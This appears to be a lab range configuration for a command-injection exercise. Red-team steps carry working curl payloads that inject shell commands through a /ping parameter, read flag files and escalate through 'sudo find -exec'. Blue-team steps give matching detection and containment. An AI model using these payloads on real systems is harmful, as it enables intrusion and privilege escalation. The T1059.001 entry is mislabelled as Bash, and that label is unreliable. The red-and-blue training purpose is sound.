@@ -1,0 +1,219 @@
+{
+  "range": "shell-command-injection",
+  "port": 8080,
+  "red": {
+    "T1595.002": {
+      "name": "Active Scanning: Vulnerability Scanning",
+      "tactics": [
+        "reconnaissance"
+      ],
+      "objective": "probe the /ping endpoint for the injection surface",
+      "command": "curl -s 'http://{TARGET}:8080/ping?host=127.0.0.1'",
+      "success_criteria": "HTTP 200 with ping output",
+      "failure_criteria": "no response",
+      "preconditions": [],
+      "alternatives": [
+        "T1046"
+      ],
+      "recovery": [
+        "retry with -m 10"
+      ],
+      "prior": 0.5
+    },
+    "T1190": {
+      "name": "Exploit Public-Facing Application",
+      "tactics": [
+        "initial-access"
+      ],
+      "objective": "confirm command-injection RCE (initial access)",
+      "command": "curl -s -G 'http://{TARGET}:8080/ping' --data-urlencode \"host=127.0.0.1;id\"",
+      "success_criteria": "output contains uid=",
+      "failure_criteria": "no uid= / 'invalid host'",
+      "preconditions": [
+        "reconnaissance"
+      ],
+      "alternatives": [
+        "T1059.004"
+      ],
+      "recovery": [
+        "try alternate injection separators | $() `"
+      ],
+      "prior": 0.6
+    },
+    "T1059.004": {
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactics": [
+        "execution"
+      ],
+      "objective": "run an arbitrary shell command via the RCE",
+      "command": "curl -s -G 'http://{TARGET}:8080/ping' --data-urlencode \"host=127.0.0.1;uname -a\"",
+      "success_criteria": "output contains Linux kernel string",
+      "failure_criteria": "blocked",
+      "preconditions": [
+        "initial-access"
+      ],
+      "alternatives": [
+        "T1059.006"
+      ],
+      "recovery": [
+        "switch interpreter"
+      ],
+      "prior": 0.55
+    },
+    "T1552.001": {
+      "name": "Unsecured Credentials: Credentials In Files",
+      "tactics": [
+        "collection"
+      ],
+      "objective": "read the user flag /home/ctf/user.txt",
+      "command": "curl -s -G 'http://{TARGET}:8080/ping' --data-urlencode \"host=127.0.0.1;cat /home/ctf/user.txt\"",
+      "success_criteria": "user flag token present",
+      "failure_criteria": "empty/blocked",
+      "preconditions": [
+        "execution"
+      ],
+      "alternatives": [
+        "T1005"
+      ],
+      "recovery": [
+        "enumerate /home first (T1083)"
+      ],
+      "prior": 0.6
+    },
+    "T1548.003": {
+      "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+      "tactics": [
+        "privilege-escalation"
+      ],
+      "objective": "enumerate the NOPASSWD sudo-find privesc",
+      "command": "curl -s -G 'http://{TARGET}:8080/ping' --data-urlencode \"host=127.0.0.1;sudo -n -l\"",
+      "success_criteria": "NOPASSWD: /usr/bin/find listed",
+      "failure_criteria": "no sudo rights",
+      "preconditions": [
+        "execution"
+      ],
+      "alternatives": [
+        "T1083.001"
+      ],
+      "recovery": [
+        "search SUID binaries"
+      ],
+      "prior": 0.6
+    },
+    "T1041": {
+      "name": "Exfiltration Over C2 Channel",
+      "tactics": [
+        "exfiltration"
+      ],
+      "objective": "escalate via sudo-find and exfiltrate the root flag",
+      "command": "curl -s -G 'http://{TARGET}:8080/ping' --data-urlencode \"host=127.0.0.1;sudo -n find /etc/hostname -exec cat /root/root.txt \\;\"",
+      "success_criteria": "root flag token present",
+      "failure_criteria": "empty/blocked",
+      "preconditions": [
+        "privilege-escalation"
+      ],
+      "alternatives": [
+        "T1005"
+      ],
+      "recovery": [
+        "retry via alternate -exec target"
+      ],
+      "prior": 0.65
+    }
+  },
+  "blue": {
+    "T1059": {
+      "name": "Command and Scripting Interpreter",
+      "tactics": [
+        "Execution"
+      ],
+      "indicators": [
+        "| grep -i 'bash -c'"
+      ],
+      "detection_conditions": [
+        "Command injection attempts via shell commands"
+      ],
+      "response": "Analyze command execution context",
+      "containment": "Restrict shell access to authorized users",
+      "detection_strategies": [
+        "Log command execution with user context"
+      ],
+      "availability_conditions": [
+        "Ensure logging is enabled and persistent"
+      ],
+      "prior": 1.0
+    },
+    "T1059.001": {
+      "name": "Command and Scripting Interpreter - Bash",
+      "tactics": [
+        "Execution"
+      ],
+      "indicators": [
+        "| grep -i 'bash -c'"
+      ],
+      "detection_conditions": [
+        "Unusual bash command execution patterns"
+      ],
+      "response": "Verify command legitimacy and user permissions",
+      "containment": "Implement strict sudo policies",
+      "detection_strategies": [
+        "Monitor for suspicious command-line arguments"
+      ],
+      "availability_conditions": [
+        "Ensure system logs are not tampered with"
+      ],
+      "prior": 1.0
+    },
+    "T1190": {
+      "name": "Detect/contain command injection on /ping",
+      "tactics": [
+        "initial-access"
+      ],
+      "indicators": [
+        "inj=1 in /var/log/shell-target/cmd.log",
+        "shell metacharacters in host param"
+      ],
+      "detection_conditions": [
+        "Wazuh rule 100714/100710 (T1190) fires"
+      ],
+      "response": "enable input-sanitiser hot patch",
+      "containment": "touch /var/lib/shell-target/patched",
+      "detection_strategies": [
+        {
+          "name": "host command-audit monitoring"
+        }
+      ],
+      "availability_conditions": [
+        "benign /ping still returns ping output"
+      ],
+      "prior": 0.6
+    },
+    "T1548.003": {
+      "name": "Detect/contain sudo-find privesc",
+      "tactics": [
+        "privilege-escalation"
+      ],
+      "indicators": [
+        "sudo / find -exec in cmd.log"
+      ],
+      "detection_conditions": [
+        "Wazuh rule 100711 (T1548.003) fires"
+      ],
+      "response": "revoke the ctf sudoers drop-in",
+      "containment": "rm -f /etc/sudoers.d/ctf",
+      "detection_strategies": [
+        {
+          "name": "privilege-escalation monitoring"
+        }
+      ],
+      "availability_conditions": [
+        "service stays up; only sudo rule removed"
+      ],
+      "prior": 0.6
+    }
+  },
+  "counts": {
+    "red": 6,
+    "blue": 4
+  }
+}
